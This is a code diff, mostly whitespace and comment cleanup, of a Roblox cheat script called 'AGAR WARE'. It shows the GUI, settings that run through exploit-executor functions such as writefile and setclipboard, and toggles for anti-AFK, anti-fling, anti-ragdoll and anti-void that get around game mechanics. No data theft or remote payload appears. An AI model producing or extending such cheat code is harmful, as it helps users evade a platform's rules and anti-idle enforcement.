@@ -6725,31 +6725,24 @@ local script = AGARWARE["2"];
 	local screenGui = getScreenGui()
 	if not screenGui then return end
 	local UserInputService = game:GetService("UserInputService")
-	
 	for _, frame in pairs(screenGui:GetChildren()) do
 		if frame.Name == "MainFrame" and frame:FindFirstChild("itsthisone") then
 			frame.Position = UDim2.new(0.5, 0, 0.5, 0)
 			frame.AnchorPoint = Vector2.new(0.5, 0.5)
 			frame.Active = true
-	
 			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
 			local dragging = false
 			local dragStart, startPos
-	
 			local inputBeganConn, inputChangedConn, inputEndedConn
-	
 			local function setupDragging()
 				if inputBeganConn then inputBeganConn:Disconnect() end
 				if inputChangedConn then inputChangedConn:Disconnect() end
 				if inputEndedConn then inputEndedConn:Disconnect() end
-	
 				local scale = uiScale and uiScale.Scale or 1
-	
 				if scale == 1 then
 					frame.Draggable = true
 				else
 					frame.Draggable = false
-	
 					inputBeganConn = frame.InputBegan:Connect(function(input)
 						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 							dragging = true
@@ -6757,7 +6750,6 @@ local script = AGARWARE["2"];
 							startPos = frame.Position
 						end
 					end)
-	
 					inputChangedConn = UserInputService.InputChanged:Connect(function(input)
 						if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
 							local delta = input.Position - dragStart
@@ -6770,7 +6762,6 @@ local script = AGARWARE["2"];
 							)
 						end
 					end)
-	
 					inputEndedConn = UserInputService.InputEnded:Connect(function(input)
 						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 							dragging = false
@@ -6778,7 +6769,6 @@ local script = AGARWARE["2"];
 					end)
 				end
 			end
-	
 			if uiScale then
 				uiScale:GetPropertyChangedSignal("Scale"):Connect(setupDragging)
 			end
@@ -6801,7 +6791,6 @@ local script = AGARWARE["3"];
 	if not gui then return end
 	local colorFrame = gui:FindFirstChild("Color")
 	if not colorFrame then return end
-	
 	local function updateColors()
 		local targetColor = colorFrame.BackgroundColor3
 		for _, obj in pairs(gui:GetDescendants()) do
@@ -6814,14 +6803,10 @@ local script = AGARWARE["3"];
 			end
 		end
 	end
-	
 	updateColors()
-	
 	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(function()
 		updateColors()
 	end)
-	
-	
 	local function updateAllBlue()
 		local targetColor = colorFrame.BackgroundColor3
 		local blueColor = Color3.fromRGB(0, 123, 255)
@@ -6844,7 +6829,6 @@ local script = AGARWARE["3"];
 			end
 		end
 	end
-	
 	updateAllBlue()
 	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(function()
 		updateColors()
@@ -6859,24 +6843,18 @@ local script = AGARWARE["4"];
 	_G.Notify("This script is still in alpha, join the discord to stay up to date!", 10)
 	task.wait(3)
 	_G.Notify("Thank you for using my script - agarvvoid", 5, 139308638407157)
-	
-	-- Owner join/leave detection
 	local Players = game:GetService("Players")
 	wait(0.5)
-	
 	Players.PlayerAdded:Connect(function(player)
 		if _G.IsAgarWareOwner(player.UserId) then
 			_G.Notify("The owner of this script joined the server!", 8, 117934611310434)
 		end
 	end)
-	
 	Players.PlayerRemoving:Connect(function(player)
 		if _G.IsAgarWareOwner(player.UserId) then
 			_G.Notify("The owner of this script left the server.", 8)
 		end
 	end)
-	
-	-- Check if owner is already in server
 	for _, player in pairs(Players:GetPlayers()) do
 		if _G.IsAgarWareOwner(player.UserId) then
 			_G.Notify("The owner of this script is in the server!", 8, 117934611310434)
@@ -6886,8 +6864,7 @@ end;
 task.spawn(C_4);
 local function C_5()
 local script = AGARWARE["5"];
-	-- Button click sound script (SOUND POOL - NO DELAY + OVERLAP)
-	-- Put this as a LocalScript under your ScreenGui
+	
 	local function getScreenGui()
 		local p = script.Parent
 		while p do
@@ -6897,10 +6874,8 @@ local script = AGARWARE["5"];
 	end
 	local screenGui = getScreenGui()
 	if not screenGui then return end
-	
 	local defaultSoundId = 134390474890852
 	local contentSoundId = 128341339664030
-	
 	local defaultPool = {}
 	for i = 1, 5 do
 		local s = Instance.new("Sound")
@@ -6909,7 +6884,6 @@ local script = AGARWARE["5"];
 		s.Parent = game:GetService("SoundService")
 		table.insert(defaultPool, s)
 	end
-	
 	local contentPool = {}
 	for i = 1, 5 do
 		local s = Instance.new("Sound")
@@ -6918,19 +6892,15 @@ local script = AGARWARE["5"];
 		s.Parent = game:GetService("SoundService")
 		table.insert(contentPool, s)
 	end
-	
 	local defaultIndex = 1
 	local contentIndex = 1
-	
 	local function playSound(pool, indexRef)
 		pool[indexRef]:Play()
 		indexRef = indexRef + 1
 		if indexRef > #pool then indexRef = 1 end
 		return indexRef
 	end
-	
 	local contentArea = screenGui:FindFirstChild("contentarea", true)
-	
 	local function isInContentArea(obj)
 		if not contentArea then return false end
 		local p = obj.Parent
@@ -6940,7 +6910,6 @@ local script = AGARWARE["5"];
 		end
 		return false
 	end
-	
 	local function addClickSound(button)
 		button.MouseButton1Click:Connect(function()
 			if isInContentArea(button) then
@@ -6950,13 +6919,11 @@ local script = AGARWARE["5"];
 			end
 		end)
 	end
-	
 	for _, obj in pairs(screenGui:GetDescendants()) do
 		if obj:IsA("TextButton") or obj:IsA("ImageButton") then
 			addClickSound(obj)
 		end
 	end
-	
 	screenGui.DescendantAdded:Connect(function(obj)
 		if obj:IsA("TextButton") or obj:IsA("ImageButton") then
 			addClickSound(obj)
@@ -6973,35 +6940,25 @@ local script = AGARWARE["b"];
 			p = p.Parent
 		end
 	end
-	
 	local screenGui = getScreenGui()
 	if not screenGui then return end
-	
 	local RunService = game:GetService("RunService")
 	local Players = game:GetService("Players")
 	local LocalPlayer = Players.LocalPlayer
-	
 	local MainFrame = screenGui:FindFirstChild("MainFrame")
 	local MinimizeButton = script.Parent:FindFirstChild("minimise")
 	local TitleText = script.Parent:FindFirstChild("text")
-	
 	if not MainFrame or not MinimizeButton or not TitleText then return end
-	
 	local InnerFrame = MainFrame:FindFirstChild("innerframe")
 	local TopBar = MainFrame:FindFirstChild("topbar")
-	
 	local isMinimized = false
 	local originalHeight = MainFrame.Size.Y.Offset
-	
 	local function toggleMinimize()
 		isMinimized = not isMinimized
 		if isMinimized then
 			if InnerFrame then InnerFrame.Visible = false end
 			local topBarHeight = TopBar and TopBar.Size.Y.Offset or 25
-	
-			-- Calculate offset to keep visual position same with center anchor
 			local heightDiff = (originalHeight - topBarHeight) / 2
-	
 			MainFrame.Size = UDim2.new(MainFrame.Size.X.Scale, MainFrame.Size.X.Offset, 0, topBarHeight)
 			MainFrame.Position = UDim2.new(
 				MainFrame.Position.X.Scale, 
@@ -7012,10 +6969,8 @@ local script = AGARWARE["b"];
 			MinimizeButton.Text = "+"
 		else
 			if InnerFrame then InnerFrame.Visible = true end
-	
 			local topBarHeight = TopBar and TopBar.Size.Y.Offset or 25
 			local heightDiff = (originalHeight - topBarHeight) / 2
-	
 			MainFrame.Size = UDim2.new(MainFrame.Size.X.Scale, MainFrame.Size.X.Offset, 0, originalHeight)
 			MainFrame.Position = UDim2.new(
 				MainFrame.Position.X.Scale, 
@@ -7026,30 +6981,20 @@ local script = AGARWARE["b"];
 			MinimizeButton.Text = "-"
 		end
 	end
-	
 	MinimizeButton.MouseButton1Click:Connect(toggleMinimize)
-	
-	-- FPS Display
 	local smoothedFPS = 60
 	local smoothing = 0.05
 	local lastTime = tick()
-	
 	RunService.RenderStepped:Connect(function()
 		local now = tick()
 		local deltaTime = now - lastTime
 		lastTime = now
 		local currentFPS = 1 / deltaTime
 		smoothedFPS = smoothedFPS + (currentFPS - smoothedFPS) * smoothing
-	
-		-- Get ping
 		local pingInSeconds = LocalPlayer:GetNetworkPing()
 		local ping = math.round(pingInSeconds * 1000)
-	
-		-- Get server player count
 		local playerCount = #Players:GetPlayers()
 		local maxPlayers = Players.MaxPlayers
-	
-		-- Format the stats part with color
 		local statsText = string.format(
 			'<font color="rgb(180,180,180)">fps %.1f | %dms | server: %d/%d</font>',
 			smoothedFPS,
@@ -7057,7 +7002,6 @@ local script = AGARWARE["b"];
 			playerCount,
 			maxPlayers
 		)
-	
 		TitleText.Text = "AGAR WARE | v3.0.0-alpha.8 | " .. statsText
 		TitleText.RichText = true
 	end)
@@ -7065,7 +7009,7 @@ end;
 task.spawn(C_b);
 local function C_16()
 local script = AGARWARE["16"];
-	-- Find ScreenGui
+	
 	local function getScreenGui()
 		local p = script.Parent
 		while p do
@@ -7073,39 +7017,24 @@ local script = AGARWARE["16"];
 			p = p.Parent
 		end
 	end
-	
 	local screenGui = getScreenGui()
 	if not screenGui then return end
-	
-	-- Get the target color from Color frame
 	local colorFrame = screenGui:FindFirstChild("Color")
 	if not colorFrame then return end
-	
 	local targetColor = colorFrame.BackgroundColor3
-	
 	local function updateAllColors()
 		targetColor = colorFrame.BackgroundColor3
 	end
-	
 	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(updateAllColors)
-	
-	-- Get references
 	local buttonContainer = script.Parent
 	local mainFrame = buttonContainer.Parent.Parent
 	local contentArea = mainFrame:FindFirstChild("contentarea")
 	if not contentArea then return end
-	
-	-- Page names
 	local pageNames = {"Home", "Main", "Troll", "Settings", "TCOMain", "Credits"}
-	
-	-- Colors
 	local INACTIVE_BG = Color3.fromRGB(10, 10, 10)
 	local ACTIVE_BG = Color3.fromRGB(20, 20, 20)
 	local INACTIVE_TEXT = Color3.fromRGB(255, 255, 255)
-	
 	_G.AgarWareCurrentPage = "Home"
-	
-	-- Create Credits page music (stays loaded, muted when not on Credits)
 	local creditsMusic = Instance.new("Sound")
 	creditsMusic.SoundId = "rbxassetid://71722939523445"
 	creditsMusic.Volume = 0
@@ -7114,22 +7043,16 @@ local script = AGARWARE["16"];
 	creditsMusic:Play()
 	_G.AgarWareCreditsMusic = creditsMusic
 	_G.AgarWareCurrentPage = "Home"
-	
 	local MUSIC_VOLUME = 0.6
 	local TweenService = game:GetService("TweenService")
-	
-	-- Function to switch pages
 	local function switchPage(pageName)
 		currentPage = pageName
 		_G.AgarWareCurrentPage = pageName
-	
-		-- Hide all pages and reset all buttons
 		for _, name in pageNames do
 			local page = contentArea:FindFirstChild(name)
 			if page then
 				page.Visible = false
 			end
-	
 			local button = buttonContainer:FindFirstChild(name)
 			if button then
 				button.BackgroundColor3 = INACTIVE_BG
@@ -7140,14 +7063,10 @@ local script = AGARWARE["16"];
 				end
 			end
 		end
-	
-		-- Show selected page
 		local selectedPage = contentArea:FindFirstChild(pageName)
 		if selectedPage then
 			selectedPage.Visible = true
 		end
-	
-		-- Highlight selected button
 		local selectedButton = buttonContainer:FindFirstChild(pageName)
 		if selectedButton then
 			selectedButton.BackgroundColor3 = ACTIVE_BG
@@ -7157,7 +7076,6 @@ local script = AGARWARE["16"];
 				text.TextTransparency = 0
 			end
 		end
-	
 		if pageName == "Credits" then
 			if not (_G.ConfigData and _G.ConfigData["mutemusic"]) then
 				TweenService:Create(creditsMusic, TweenInfo.new(0.5), {Volume = MUSIC_VOLUME}):Play()
@@ -7166,7 +7084,6 @@ local script = AGARWARE["16"];
 			TweenService:Create(creditsMusic, TweenInfo.new(0.5), {Volume = 0}):Play()
 		end
 	end
-	
 	local function updateActivePageColor()
 		local selectedButton = buttonContainer:FindFirstChild(currentPage)
 		if selectedButton then
@@ -7176,13 +7093,10 @@ local script = AGARWARE["16"];
 			end
 		end
 	end
-	
 	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(function()
 		updateAllColors()
 		updateActivePageColor()
 	end)
-	
-	-- Connect all buttons
 	for _, pageName in pageNames do
 		local button = buttonContainer:FindFirstChild(pageName)
 		if button then
@@ -7191,8 +7105,6 @@ local script = AGARWARE["16"];
 			end)
 		end
 	end
-	
-	-- Set default page
 	switchPage("Home")
 end;
 task.spawn(C_16);
@@ -7208,7 +7120,6 @@ task.spawn(C_48);
 local function C_4e()
 local script = AGARWARE["4e"];
 	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox
-	
 	local groupbox = script.Parent
 	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
 	local function getScreenGui()
@@ -7235,13 +7146,6 @@ local script = AGARWARE["4e"];
 		end
 		updateSize()
 	end
-	
-	
-	
-	-- ====================================================================================================
-	-- GROUPBOX/TAB CONFIGS
-	-- ====================================================================================================
-	
 	_G.CreateButton({
 		frame = "discord",
 		groupbox = script,
@@ -7250,13 +7154,11 @@ local script = AGARWARE["4e"];
 			local success = pcall(function()
 				setclipboard("https://discord.gg/7fDasxV2Ht")
 			end)
-	
 			if success then
 				_G.Notify("Discord link copied to clipboard!", 3)
 			else
 				_G.Notify("Failed to copy link!", 3)
 			end
-	
 			return success
 		end,
 		afterMessage = "Copied to clipboard!",
@@ -7269,7 +7171,6 @@ task.spawn(C_4e);
 local function C_77()
 local script = AGARWARE["77"];
 	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox
-	
 	local groupbox = script.Parent
 	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
 	local function getScreenGui()
@@ -7296,13 +7197,6 @@ local script = AGARWARE["77"];
 		end
 		updateSize()
 	end
-	
-	
-	
-	-- ====================================================================================================
-	-- GROUPBOX/TAB CONFIGS
-	-- ====================================================================================================
-	
 	_G.CreateButton({
 		frame = "discord",
 		groupbox = script,
@@ -7311,13 +7205,11 @@ local script = AGARWARE["77"];
 			local success = pcall(function()
 				setclipboard("https://discord.gg/7fDasxV2Ht")
 			end)
-	
 			if success then
 				_G.Notify("Discord link copied to clipboard!", 3)
 			else
 				_G.Notify("Failed to copy link!", 3)
 			end
-	
 			return success
 		end,
 		afterMessage = "Copied to clipboard!",
@@ -7330,21 +7222,16 @@ task.spawn(C_77);
 local function C_82()
 local script = AGARWARE["82"];
 	local player = game.Players.LocalPlayer
-	-- Get references to your UI elements
 	local display = script.Parent.display
 	local username = script.Parent.username
 	local joindate = script.Parent.joindate
 	local profile = script.Parent.profile
 	local title = script.Parent.Parent["======TITLE======"].text
-	-- Set display name
 	display.Text = player.DisplayName
-	-- Set username with @ format
 	username.Text = "@" .. player.Name
-	-- Get account creation date and calculate age
 	local accountAge = player.AccountAge
 	local currentDate = os.date("*t")
 	local joinDate = os.date("*t", os.time() - (accountAge * 86400))
-	-- Format: 🗓️ YYYY-MM-DD (X days)
 	local formattedDate = string.format("🗓️ %04d-%02d-%02d (%d days)", 
 		joinDate.year, 
 		joinDate.month, 
@@ -7352,21 +7239,18 @@ local script = AGARWARE["82"];
 		accountAge
 	)
 	joindate.Text = formattedDate
-	-- Set profile picture
 	local userId = player.UserId
 	local thumbType = Enum.ThumbnailType.HeadShot
 	local thumbSize = Enum.ThumbnailSize.Size420x420
 	local content = game:GetService("Players"):GetUserThumbnailAsync(userId, thumbType, thumbSize)
 	profile.Image = content
 	profile.Visible = true
-	-- Set title with display name
 	title.Text = "Welcome, " .. player.DisplayName
 end;
 task.spawn(C_82);
 local function C_a8()
 local script = AGARWARE["a8"];
 	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox
-	
 	local groupbox = script.Parent
 	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
 	local function getScreenGui()
@@ -7393,14 +7277,6 @@ local script = AGARWARE["a8"];
 		end
 		updateSize()
 	end
-	
-	
-	
-	-- ====================================================================================================
-	-- GROUPBOX/TAB CONFIGS
-	-- ====================================================================================================
-	
-	
 	_G.CreateButton({
 		frame = "destroygui",
 		groupbox = script,
@@ -7409,19 +7285,14 @@ local script = AGARWARE["a8"];
 		confirmMessage = "Destroy GUI?",
 		confirmWait = 0.7,
 		callback = function()
-			-- Disconnect ALL _G connections automatically
 			for key, value in pairs(_G) do
-				-- Disconnect RBXScriptConnection objects
 				if type(value) == "userdata" and typeof(value) == "RBXScriptConnection" then
 					pcall(function() value:Disconnect() end)
 				end
-				-- Cancel task threads
 				if type(value) == "thread" then
 					pcall(function() task.cancel(value) end)
 				end
 			end
-	
-			-- Clear all _G variables
 			_G.CreateToggle = nil
 			_G.CreateButton = nil
 			_G.CreateButtonToggle = nil
@@ -7440,8 +7311,6 @@ local script = AGARWARE["a8"];
 			_G.IsWhitelisted = nil
 			_G.IsOwner = nil
 			_G.IsHWIDBanned = nil
-	
-			-- Find and destroy the ScreenGui
 			local function getScreenGui()
 				local p = script.Parent
 				while p do
@@ -7449,7 +7318,6 @@ local script = AGARWARE["a8"];
 					p = p.Parent
 				end
 			end
-	
 			local screenGui = getScreenGui()
 			if screenGui then
 				screenGui:Destroy()
@@ -7461,7 +7329,6 @@ task.spawn(C_a8);
 local function C_c0()
 local script = AGARWARE["c0"];
 	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox
-	
 	local groupbox = script.Parent
 	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
 	local function getScreenGui()
@@ -7488,20 +7355,7 @@ local script = AGARWARE["c0"];
 		end
 		updateSize()
 	end
-	
-	
-	
-	-- ====================================================================================================
-	-- GROUPBOX/TAB CONFIGS
-	-- ====================================================================================================
-	
-	
-	-- ====================================================================================================
-	-- TEXT SCALING
-	-- ====================================================================================================
-	-- Store original text sizes
 	local originalSizes = {}
-	
 	_G.CreateSlider({
 		frame = "textsize",
 		groupbox = script,
@@ -7516,16 +7370,12 @@ local script = AGARWARE["c0"];
 			while screenGui and not screenGui:IsA("ScreenGui") do
 				screenGui = screenGui.Parent
 			end
-	
 			if screenGui then
 				for _, obj in pairs(screenGui:GetDescendants()) do
 					if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
-						-- Store original size on first run
 						if not originalSizes[obj] then
 							originalSizes[obj] = obj.TextSize
 						end
-	
-						-- Calculate offset (5 = no change)
 						local offset = value - 5
 						obj.TextSize = originalSizes[obj] + offset
 					end
@@ -7533,13 +7383,6 @@ local script = AGARWARE["c0"];
 			end
 		end
 	})
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- GUI SCALING
-	-- ====================================================================================================
 	_G.CreateTextbox({
 		frame = "guisize",
 		textboxname = "guisize",
@@ -7548,20 +7391,12 @@ local script = AGARWARE["c0"];
 		hovercolor = true,
 		callback = function(text)
 			local value = tonumber(text)
-	
 			if not value then return end
-	
-			-- Clamp between 0.70 and 2.50
 			value = math.clamp(value, 0.70, 2.50)
-	
-			-- Round to 2 decimals
 			value = math.floor(value * 100 + 0.5) / 100
-	
-			-- Update textbox to show formatted value
 			local p = script.Parent
 			while p do
 				if p:IsA("ScreenGui") then
-					-- Find the textbox and update its display
 					local frame = script.Parent:FindFirstChild("guisize")
 					if frame then
 						local textboxFrame = frame:FindFirstChild("guisize")
@@ -7572,8 +7407,6 @@ local script = AGARWARE["c0"];
 							end
 						end
 					end
-	
-					-- Apply scale
 					local uiScale = p:FindFirstChildOfClass("UIScale")
 					if not uiScale then
 						uiScale = Instance.new("UIScale")
@@ -7586,8 +7419,6 @@ local script = AGARWARE["c0"];
 			end
 		end
 	})
-	
-	-- Apply saved GUI scale on startup
 	task.wait(0.1)
 	local savedScale = _G.ConfigData["guisize_guisize"]
 	if savedScale then
@@ -7595,7 +7426,6 @@ local script = AGARWARE["c0"];
 		if value then
 			value = math.clamp(value, 0.70, 2.50)
 			value = math.floor(value * 100 + 0.5) / 100
-	
 			local p = script.Parent
 			while p do
 				if p:IsA("ScreenGui") then
@@ -7611,20 +7441,6 @@ local script = AGARWARE["c0"];
 			end
 		end
 	end
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- DISABLE TOOLTIP
-	-- ====================================================================================================
 	local function getScreenGui()
 		local p = script.Parent
 		while p do
@@ -7634,10 +7450,8 @@ local script = AGARWARE["c0"];
 	end
 	local screenGui = getScreenGui()
 	if not screenGui then return end
-	
 	local tooltip = screenGui:FindFirstChild("Tooltip")
 	local uiScale = tooltip and tooltip:FindFirstChildOfClass("UIScale")
-	
 	_G.CreateSlider({
 		frame = "tooltipsize",
 		groupbox = script,
@@ -7652,28 +7466,6 @@ local script = AGARWARE["c0"];
 			end
 		end
 	})
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- RESET SETTINGS
-	-- ====================================================================================================
-	-- ====================================================================================================
-	-- RESET SETTINGS
-	-- ====================================================================================================
 	_G.CreateButton({
 		frame = "resetdefault",
 		groupbox = script,
@@ -7682,40 +7474,25 @@ local script = AGARWARE["c0"];
 		confirmMessage = "Please press again...",
 		confirmWait = 1.5,
 		callback = function()
-			-- Reset text size to default (5)
 			_G.ConfigData["textsize"] = 5
-	
-			-- Reset GUI scale to default (1.00)
 			_G.ConfigData["guisize_guisize"] = "1.00"
-	
-			-- Reset tooltip size to default (1.00)
 			_G.ConfigData["tooltipsize"] = 1
-	
-			-- Reset center color picker to default (false)
 			_G.ConfigData["centercolorpicker"] = false
-	
-			-- Reset GUI color theme to default
 			_G.ConfigData["guicolortheme_guicolortheme"] = {
 				r = 0,
 				g = 123,
 				b = 255,
 				a = 0
 			}
-	
-			-- Save config
 			local HttpService = game:GetService("HttpService")
 			pcall(function()
 				writefile("myconfig.json", HttpService:JSONEncode(_G.ConfigData))
 			end)
-	
-			-- Apply text size reset
 			local screenGui = script.Parent
 			while screenGui and not screenGui:IsA("ScreenGui") do
 				screenGui = screenGui.Parent
 			end
-	
 			if screenGui then
-				-- Reset text sizes
 				for _, obj in pairs(screenGui:GetDescendants()) do
 					if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
 						if originalSizes[obj] then
@@ -7723,8 +7500,6 @@ local script = AGARWARE["c0"];
 						end
 					end
 				end
-	
-				-- Update text size slider display
 				local textsizeFrame = script.Parent:FindFirstChild("textsize")
 				if textsizeFrame then
 					local button = textsizeFrame:FindFirstChild("button")
@@ -7732,21 +7507,16 @@ local script = AGARWARE["c0"];
 						local sliderFrame = button:FindFirstChild("sliderFrame")
 						local text = button:FindFirstChild("text")
 						local fillBar = sliderFrame and sliderFrame:FindFirstChild("fillbar")
-	
 						if fillBar and text then
 							fillBar.Size = UDim2.new(0.5, 0, 1, 0)
 							text.Text = "5 / 10"
 						end
 					end
 				end
-	
-				-- Reset GUI scale
 				local uiScale = screenGui:FindFirstChildOfClass("UIScale")
 				if uiScale then
 					uiScale.Scale = 1.00
 				end
-	
-				-- Update GUI size textbox display
 				local guisizeFrame = script.Parent:FindFirstChild("guisize")
 				if guisizeFrame then
 					local textboxFrame = guisizeFrame:FindFirstChild("guisize")
@@ -7757,15 +7527,11 @@ local script = AGARWARE["c0"];
 						end
 					end
 				end
-	
-				-- Reset tooltip size
 				local tooltip = screenGui:FindFirstChild("Tooltip")
 				local tooltipScale = tooltip and tooltip:FindFirstChildOfClass("UIScale")
 				if tooltipScale then
 					tooltipScale.Scale = 1.00
 				end
-	
-				-- Update tooltip size slider display
 				local tooltipsizeFrame = script.Parent:FindFirstChild("tooltipsize")
 				if tooltipsizeFrame then
 					local button = tooltipsizeFrame:FindFirstChild("button")
@@ -7773,34 +7539,21 @@ local script = AGARWARE["c0"];
 						local sliderFrame = button:FindFirstChild("sliderFrame")
 						local text = button:FindFirstChild("text")
 						local fillBar = sliderFrame and sliderFrame:FindFirstChild("fillbar")
-	
 						if fillBar and text then
-							fillBar.Size = UDim2.new(0.333, 0, 1, 0) -- 1.00 out of 0-3
+							fillBar.Size = UDim2.new(0.333, 0, 1, 0) 
 							text.Text = "1.00 / 3.00"
 						end
 					end
 				end
-	
-				-- Reset center color picker toggle
 				_G.CenterColorPicker = false
-	
-				-- Reset GUI color theme
 				local colorFrame = screenGui:FindFirstChild("Color")
 				if colorFrame then
 					colorFrame.BackgroundColor3 = Color3.fromRGB(0, 123, 255)
 				end
 			end
-	
 			_G.Notify("UI settings reset to default!", 3)
 		end,
 	})
-	
-	
-	
-	
-	
-	
-	
 	_G.CreateToggle({
 		frame = "centercolorpicker",
 		groupbox = script,
@@ -7809,16 +7562,6 @@ local script = AGARWARE["c0"];
 			_G.CenterColorPicker = isEnabled
 		end
 	})
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
 	_G.CreateColorPicker({
 		frame = "guicolortheme",
 		colorpickerframe = "guicolortheme",
@@ -7828,7 +7571,6 @@ local script = AGARWARE["c0"];
 		alpha = false,
 		groupbox = script,
 		callback = function(color, alpha)
-			-- Find the ScreenGui
 			local function getScreenGui()
 				local p = script.Parent
 				while p do
@@ -7836,11 +7578,8 @@ local script = AGARWARE["c0"];
 					p = p.Parent
 				end
 			end
-	
 			local screenGui = getScreenGui()
 			if not screenGui then return end
-	
-			-- Find the Color frame
 			local colorFrame = screenGui:FindFirstChild("Color")
 			if colorFrame then
 				colorFrame.BackgroundColor3 = color
@@ -7852,7 +7591,6 @@ task.spawn(C_c0);
 local function C_114()
 local script = AGARWARE["114"];
 	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
-	
 	local groupbox = script.Parent
 	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
 	local function getScreenGui()
@@ -7879,21 +7617,13 @@ local script = AGARWARE["114"];
 		end
 		updateSize()
 	end
-	
-	
-	
-	-- ====================================================================================================
-	-- ANTI AFK
-	-- ====================================================================================================
 	local afkConnection = nil
-	
 	_G.CreateToggle({
 		frame = "afk",
 		groupbox = script,
 		tooltip = "Prevents you from disconnecting from being AFK for 20 minutes.",
 		callback = function(isEnabled)
 			if isEnabled then
-				-- Enable Anti-AFK
 				afkConnection = task.spawn(function()
 					while isEnabled and _G.ConfigData["afk"] do
 						local virtualUser = game:GetService("VirtualUser")
@@ -7903,7 +7633,6 @@ local script = AGARWARE["114"];
 					end
 				end)
 			else
-				-- Disable Anti-AFK
 				if afkConnection then
 					task.cancel(afkConnection)
 					afkConnection = nil
@@ -7911,24 +7640,16 @@ local script = AGARWARE["114"];
 			end
 		end
 	})
-	
-	-- ====================================================================================================
-	-- ANTI FLING
-	-- ====================================================================================================
 	local Players = game:GetService("Players")
 	local LocalPlayer = Players.LocalPlayer
 	local RunService = game:GetService("RunService")
-	
 	local antiFlingConnection = nil
-	
 	_G.CreateToggle({
 		frame = "fling",
 		groupbox = script,
 		tooltip = "Disables collision with other players to prevent you from getting flung.",
 		callback = function(isEnabled)
 			if isEnabled then
-				-- Enable Anti-Fling
-				-- Set all current players to no collide
 				for _, player in pairs(Players:GetPlayers()) do
 					if player ~= LocalPlayer and player.Character then
 						for _, part in pairs(player.Character:GetDescendants()) do
@@ -7938,15 +7659,11 @@ local script = AGARWARE["114"];
 						end
 					end
 				end
-	
-				-- Use Stepped for better anti-fling
 				if antiFlingConnection then
 					antiFlingConnection:Disconnect()
 				end
-	
 				antiFlingConnection = RunService.Stepped:Connect(function()
 					if not _G.ConfigData["fling"] then return end
-	
 					for _, player in pairs(Players:GetPlayers()) do
 						if player ~= LocalPlayer and player.Character then
 							for _, part in pairs(player.Character:GetDescendants()) do
@@ -7958,13 +7675,10 @@ local script = AGARWARE["114"];
 					end
 				end)
 			else
-				-- Disable Anti-Fling
 				if antiFlingConnection then
 					antiFlingConnection:Disconnect()
 					antiFlingConnection = nil
 				end
-	
-				-- Re-enable collision for all players
 				for _, player in pairs(Players:GetPlayers()) do
 					if player ~= LocalPlayer and player.Character then
 						for _, part in pairs(player.Character:GetDescendants()) do
@@ -7977,23 +7691,16 @@ local script = AGARWARE["114"];
 			end
 		end
 	})
-	
-	-- ====================================================================================================
-	-- ANTI RAGDOLL
-	-- ====================================================================================================
 	local Players = game:GetService("Players")
 	local LocalPlayer = Players.LocalPlayer
 	local RunService = game:GetService("RunService")
-	
 	local ragdollConnection = nil
-	
 	_G.CreateToggle({
 		frame = "ragdoll",
 		groupbox = script,
 		tooltip = "Prevents your character from ragdolling.",
 		callback = function(isEnabled)
 			if isEnabled then
-				-- Enable Anti-Ragdoll
 				local character = LocalPlayer.Character
 				if character then
 					local humanoid = character:FindFirstChildOfClass("Humanoid")
@@ -8002,18 +7709,12 @@ local script = AGARWARE["114"];
 						humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
 					end
 				end
-	
-				-- Loop to constantly prevent ragdoll
 				ragdollConnection = RunService.Heartbeat:Connect(function()
 					if not _G.ConfigData["ragdoll"] then return end
-	
 					local chr = LocalPlayer.Character
 					if not chr then return end
-	
 					local hum = chr:FindFirstChildOfClass("Humanoid")
 					if not hum then return end
-	
-					-- Disable ragdoll constraints
 					for _, part in pairs(chr:GetDescendants()) do
 						if part:IsA("BallSocketConstraint") or part:IsA("HingeConstraint") then
 							if part:FindFirstAncestorOfClass("Motor6D") == nil then
@@ -8021,20 +7722,16 @@ local script = AGARWARE["114"];
 							end
 						end
 					end
-	
-					-- Force humanoid out of ragdoll state
 					if hum:GetState() == Enum.HumanoidStateType.Ragdoll or
 						hum:GetState() == Enum.HumanoidStateType.FallingDown then
 						hum:ChangeState(Enum.HumanoidStateType.GettingUp)
 					end
 				end)
 			else
-				-- Disable Anti-Ragdoll
 				if ragdollConnection then
 					ragdollConnection:Disconnect()
 					ragdollConnection = nil
 				end
-	
 				local character = LocalPlayer.Character
 				if character then
 					local humanoid = character:FindFirstChildOfClass("Humanoid")
@@ -8046,73 +7743,51 @@ local script = AGARWARE["114"];
 			end
 		end
 	})
-	
-	-- ====================================================================================================
-	-- ANTI VOID
-	-- ====================================================================================================
 	local voidConnection = nil
-	
 	_G.CreateToggle({
 		frame = "void",
 		groupbox = script,
 		tooltip = "Disables you from dying in the void.",
